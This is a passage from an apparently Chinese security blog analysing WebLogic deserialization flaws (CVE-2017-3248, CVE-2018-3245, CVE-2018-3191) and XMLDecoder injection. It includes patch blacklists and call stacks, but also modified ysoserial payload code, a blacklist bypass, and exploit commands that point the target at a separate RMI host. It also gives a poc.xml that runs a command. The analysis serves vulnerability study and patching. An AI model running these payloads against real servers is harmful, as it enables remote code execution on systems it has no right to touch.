class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(unicastRef);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Registry.class &#125;, remoteObjectInvocationHandler);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> streamMessageImpl(Serializer.serialize(object));</span><br><span class="line">    <span class="comment">// or</span></span><br><span class="line">    <span class="comment">// StreamMessageImpl streamMessage = new StreamMessageImpl();</span></span><br><span class="line">    <span class="comment">// byte[] serialize = Serializer.serialize(object);</span></span><br><span class="line">    <span class="comment">// streamMessage.setDataBuffer(serialize,serialize.length);</span></span><br><span class="line">    <span class="comment">// return streamMessage;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复</strong>：<br>18年7月的p27919965_1036_Generic补丁</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_PACKAGES = </span><br><span class="line">&#123; <span class="string">&quot;org.apache.commons.collections.functors&quot;</span>,</span><br><span class="line"> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>,</span><br><span class="line"> <span class="string">&quot;javassist&quot;</span>, <span class="string">&quot;java.rmi.activation&quot;</span>, </span><br><span class="line"> <span class="string">&quot;sun.rmi.server&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_BLACKLIST_CLASSES = </span><br><span class="line">&#123; <span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>,</span><br><span class="line"><span class="string">&quot;org.codehaus.groovy.runtime.ConversionHandler&quot;</span>,</span><br><span class="line"><span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>, <span class="string">&quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;</span>, <span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, </span><br><span class="line"><span class="string">&quot;java.rmi.server.RemoteObjectInvocationHandler&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p>对<code>java.rmi.activation.*</code>、<code>sun.rmi.server.*</code>、<code>java.rmi.server.RemoteObjectInvocationHandler</code>、<code>java.rmi.server.UnicastRemoteObject</code>进行了过滤</p>
<h3 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h3><p>这里过滤了RemoteObjectInvocationHandler和UnicastRemoteObject，需要重新找到一个替代类，但是总体的思想没有变<br>观察CVE-2017-3248中的函数调用栈，会调用RemoteObject的readObject方法，所以这里只需要找到继承<code>java.rmi.server.RemoteObject</code>的类就行<br>查看RemoteObject的子类：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230812224636.png"><br>可利用的类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.management.remote.rmi.RMIConnectionImpl_Stub</span><br><span class="line">com.sun.jndi.rmi.registry.ReferenceWrapper_Stub</span><br><span class="line">javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">sun.rmi.registry.RegistryImpl_Stub</span><br><span class="line">sun.rmi.transport.DGCImpl_Stub</span><br><span class="line">sun.management.jmxremote.SingleEntryRegistry</span><br></pre></td></tr></table></figure>

<p>继续修改payloads.JRMPClient</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnectionImpl_Stub;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(<span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">    <span class="type">UnicastRef</span> <span class="variable">unicastRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">RMIConnectionImpl_Stub</span> <span class="variable">stub</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnectionImpl_Stub</span>(ref);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复</strong><br>2018年8月发布的p28343311_1036_201808Generic补丁<br>它将java.rmi.server.RemoteObject加入到黑名单，使用网上一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230812225346.png"></p>
<h3 id="CVE-2018-3191"><a href="#CVE-2018-3191" class="headerlink" title="CVE-2018-3191"></a>CVE-2018-3191</h3><p>这个漏洞是T3+JNDI<br><strong>漏洞复现</strong>：<br>直接下载这个利用工具<a target="_blank" rel="noopener" href="https://github.com/m00zh33/CVE-2018-3191">https://github.com/m00zh33/CVE-2018-3191</a><br>然后配合JNDI利用工具<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a><br>python脚本依然使用cve-2017-3248的脚本，修改一些参数即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;touch /tmp/cve-2018-3191&quot;</span> -A <span class="string">&quot;192.168.155.90&quot;</span></span><br><span class="line">python cve-2018-3191.py 127.0.0.1 7001 weblogic-spring-jndi-10.3.6.0.jar rmi://192.168.155.90:1099/ushw72</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230813154112.png"><br><strong>漏洞分析</strong>：<br>在JndiTemplate类的lookup处下断点，开启调试<br>函数调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">155</span>, JndiTemplate (com.bea.core.repackaged.springframework.jndi)</span><br><span class="line">lookupUserTransaction:<span class="number">565</span>, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)</span><br><span class="line">initUserTransactionAndTransactionManager:<span class="number">444</span>, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)</span><br><span class="line">readObject:<span class="number">1198</span>, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">601</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1004</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1891</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1796</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1348</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">370</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">69</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:<span class="number">41</span>, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:<span class="number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:<span class="number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:<span class="number">330</span>, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:<span class="number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:<span class="number">960</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:<span class="number">897</span>, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:<span class="number">130</span>, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:<span class="number">29</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">42</span>, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:<span class="number">145</span>, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:<span class="number">117</span>, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure>

<p>前面这些步骤不需要管，这条链就4个步骤<br>观察initUserTransactionAndTransactionManager方法，userTransactionName是我们设置的rmi地址<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230813162555.png"><br>最后通过lookup函数查询rmi<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230813162741.png"><br>根据以上分析，也可以通过修改ysoserial来获得payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// if(command == null) &#123;</span></span><br><span class="line">    <span class="comment">//     command = &quot;rmi://localhost:1099/Exploit&quot;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">    jtaTransactionManager.setUserTransactionName(command);</span><br><span class="line">    <span class="keyword">return</span> jtaTransactionManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复</strong>：<br>2018年8月发布p28343311_1036_Generic补丁，它将JtaTransactionManager的父类AbstractPlatformTransactionManager加入到了黑名单<br>复制网上一张图<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230813163136.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://er1cccc.gitee.io/r2/2021/11/04/weblogic%E5%8F%A4%E8%80%81%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/">weblogic古老漏洞梳理 | r2’s blog (gitee.io)</a><br><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/web-13470.html">修复weblogic的JAVA反序列化漏洞的多种方法 | WooYun知识库 (xmd5.com)</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/229140.html">从防护角度看Weblogic反序列化历史漏洞 - FreeBuf网络安全行业门户</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9932">weblogic漏洞大杂烩</a></p>
<h2 id="基于XML"><a href="#基于XML" class="headerlink" title="基于XML"></a>基于XML</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>XMLDecoder</strong>：<br>官方文档解释</p>
<blockquote>
<p>The XMLDecoder class is used to read XML documents created using the XMLEncoder and is used just like the ObjectInputStream.</p>
</blockquote>
<p>package: java.beans<br>example:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XMLDecoder</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;Test.xml&quot;</span>)));</span><br><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> d.readObject();</span><br><span class="line">d.close();</span><br></pre></td></tr></table></figure>

<p>Constructor and Method:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">XMLDecoder(InputSource is)</span><br><span class="line"><span class="comment">//Creates a new decoder to parse XML archives created by the XMLEncoder class.</span></span><br><span class="line"></span><br><span class="line">XMLDecoder(InputStream in)</span><br><span class="line"><span class="comment">//Creates a new input stream for reading archives created by the XMLEncoder class.</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">Object <span class="title function_">readObject</span><span class="params">()</span></span><br><span class="line"><span class="comment">//Reads the next object from the underlying input stream.</span></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p><strong>XMLEncoder</strong>:<br>官方文档解释</p>
<blockquote>
<p>The XMLEncoder class is a complementary alternative to the ObjectOutputStream and can used to generate a textual representation of a JavaBean in the same way that the ObjectOutputStream can be used to create binary representation of Serializable objects.</p>
</blockquote>
<p>example:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XMLEncoder</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLEncoder</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Test.xml&quot;</span>)));</span><br><span class="line">e.writeObject(<span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;Hello, world&quot;</span>));</span><br><span class="line">e.close();</span><br></pre></td></tr></table></figure>

<p>Constructor and Method:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XMLEncoder(OutputStream out)</span><br><span class="line"><span class="comment">//Creates a new XML encoder to write out JavaBeans to the stream out using an XML encoding.</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object o)</span></span><br><span class="line"><span class="comment">//Write an XML representation of the specified object to the output.</span></span><br></pre></td></tr></table></figure>

<h3 id="XMLDecoder反序列化测试"><a href="#XMLDecoder反序列化测试" class="headerlink" title="XMLDecoder反序列化测试"></a>XMLDecoder反序列化测试</h3><p>测试类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> XmlDecoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XmlDecoderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">XMLDecoder</span> <span class="variable">xmlDecoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\code\\javacode\\java-sec\\src\\main\\java\\XmlDecoder\\poc.xml&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> xmlDecoder.readObject();</span><br><span class="line">        xmlDecoder.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试poc.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>命令执行成功<br><strong>流程分析</strong>：<br>关键函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">scanDocument</span><span class="params">(<span class="type">boolean</span> complete)</span></span><br><span class="line"><span class="keyword">throws</span> IOException, XNIException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// keep dispatching &quot;events&quot;</span></span><br><span class="line">    fEntityManager.setEntityHandler(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">//System.out.println(&quot; get Document Handler in NSDocumentHandler &quot; + fDocumentHandler );</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">event</span> <span class="operator">=</span> next();</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (event) &#123;</span><br><span class="line">            <span class="comment">// 7</span></span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.START_DOCUMENT :</span><br><span class="line">                <span class="comment">//fDocumentHandler.startDocument(fEntityManager.getEntityScanner(),fEntityManager.getEntityScanner().getVersion(),fNamespaceContext,null);// not able to get</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 1</span></span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.START_ELEMENT :</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in scann element&quot;);</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.startElement(getElementQName(),fAttributes,null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 4</span></span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.CHARACTERS :</span><br><span class="line">                fDocumentHandler.characters(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.SPACE:</span><br><span class="line">                <span class="comment">//check if getCharacterData() is the right function to retrieve ignorableWhitespace information.</span></span><br><span class="line">                <span class="comment">//System.out.println(&quot;in the space&quot;);</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.ignorableWhitespace(getCharacterData(), null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ENTITY_REFERENCE :</span><br><span class="line">                <span class="comment">//entity reference callback are given in startEntity</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.PROCESSING_INSTRUCTION :</span><br><span class="line">                fDocumentHandler.processingInstruction(getPITarget(),getPIData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.COMMENT :</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in COMMENT of the XMLNSDocumentScannerImpl&quot;);</span></span><br><span class="line">                fDocumentHandler.comment(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.DTD :</span><br><span class="line">                <span class="comment">//all DTD related callbacks are handled in DTDScanner.</span></span><br><span class="line">                <span class="comment">//1. Stax doesn&#x27;t define DTD states as it does for XML Document.</span></span><br><span class="line">                <span class="comment">//therefore we don&#x27;t need to take care of anything here. So Just break;</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.CDATA:</span><br><span class="line">                fDocumentHandler.startCDATA(<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//xxx: check if CDATA values comes from getCharacterData() function</span></span><br><span class="line">                fDocumentHandler.characters(getCharacterData(),<span class="literal">null</span>);</span><br><span class="line">                fDocumentHandler.endCDATA(<span class="literal">null</span>);</span><br><span class="line">                <span class="comment">//System.out.println(&quot; in CDATA of the XMLNSDocumentScannerImpl&quot;);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.NOTATION_DECLARATION :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ENTITY_DECLARATION :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.NAMESPACE :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.ATTRIBUTE :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 2</span></span><br><span class="line">            <span class="keyword">case</span> XMLStreamConstants.END_ELEMENT :</span><br><span class="line">                <span class="comment">//do not give callback here.</span></span><br><span class="line">                <span class="comment">//this callback is given in scanEndElement function.</span></span><br><span class="line">                <span class="comment">//fDocumentHandler.endElement(getElementQName(),null);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>(<span class="string">&quot;processing event: &quot;</span> + event);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        